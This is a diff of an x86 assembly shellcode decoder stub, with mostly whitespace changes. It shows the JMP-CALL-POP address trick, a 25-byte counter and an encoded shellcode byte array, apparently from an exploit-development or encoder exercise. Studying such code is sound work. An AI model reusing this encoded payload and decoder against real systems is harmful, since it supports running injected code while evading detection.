@@ -5,11 +5,11 @@ global _start
 section .text
 _start:
 
-	jmp short call_shellcode
+  jmp short call_shellcode
 
 decoder:
-	pop esi                      ; pop address of the shellcode in ESI
-	xor ecx, ecx                 ; zeroize ECX register
+  pop esi                      ; pop address of the shellcode in ESI
+  xor ecx, ecx                 ; zeroize ECX register
   mov cl, 25                   ; counter = 25 (length of the shellcode)
   
 decode:
@@ -35,5 +35,5 @@ shellcode:
   
 call_shellcode:
 
-	call decoder
+  call decoder
   EncodedShellcode: db 0x3e,0xcd,0x5d,0x75,0x3c,0x3c,0x80,0x75,0x75,0x3c,0x6f,0x76,0x7b,0x96,0xf0,0x5d,0x96,0xef,0x60,0x96,0xee,0xbd,0x18,0xda,0x8d
